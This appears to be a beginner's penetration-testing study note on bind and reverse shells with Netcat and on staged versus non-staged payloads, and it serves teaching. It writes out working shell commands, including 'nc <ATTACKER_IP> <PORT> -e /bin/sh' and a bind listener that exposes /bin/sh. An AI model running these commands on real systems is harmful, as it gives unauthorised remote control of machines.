# Shells

Shell: It refers to Access to a Machine.

There are 2 Types of Shells:
1. Bind Shell
2. Reverse Shell

We will use a tool called **Netcat**.

## Reverse Shell

- Most Commonly Used ie. 95% of the times.
- **TARGET CONNECTS TO THE ATTACKER**
- Attacker Send Exploit to Target which Connects the Target to Attackers Machine.

**ATTACKER**

> nc -nvlp <PORT_NUMBER>

-n : numeric-only IP addresses, no DNS
-v : verbose
-l : listen mode, for inbound connects
-p : local port number

**TARGET**

> nc <ATTACKER_IP> <PORT_NUMBER> -e /bin/sh

-e : specify filename  to exec after connect
	- /bin/sh -> Linux
	- /bin/cmd.exe -> Windows

![[Pasted image 20221105013902.png]]

### TARGET

![[Pasted image 20221105015029.png]]

### ATTACKER

![[Pasted image 20221105015304.png]]

### TARGET

![[Pasted image 20221105015420.png]]

## BIND SHELL

- Not Commonly used. Used mostly in External Assessments when there is an Error while Target trying to Connect to Our Attacker Machine inside a VM due to NAT issues, Bypass Firewall etc.
- **ATTACKER CONNECTS TO THE TARGET**
- Attacker Send Exploit to Target which Runs Netcat in Listen Mode on a Specific Port.

**TARGET**

> nc -nvlp <PORT_NUMBER> -e /bin/sh

**ATTACKER**

> nc <PORT_NUMBER>

![[Pasted image 20221105014329.png]]

### ATTACKER

![[Pasted image 20221105015843.png]]

### TARGET

![[Pasted image 20221105020021.png]]


# Payloads

**Payload**
- It refers to Malicious Code that is Sent with the Help of an Exploit to Attack a Machine ie. Get a Shell Back.

There are various kinds of Paylods ie. Windows Payload, Linux Payload, Meterpreter Payload, Python Payload etc.

There are 2 types of Payloads:
1. Non-Staged Payloads
2. Staged Payloads

## Non Staged

- Larger Payloads. Doesn't Always Work.
- Sends the Whole Payload at Once.
- Eg. /windows/meterpreter_reverse_tcp

## Staged

- Can be Less Stable.
- Sends Payloads in Stages.
- Eg. /windows/meterpreter/reverse_tcp

where, reverse_tcp -> Reverse Shell over TCP Connection.

If One Type of Payloads and Shells Doesn't Work, Try Another Types of Payloads and Shells.

![[Pasted image 20221105022905.png]]
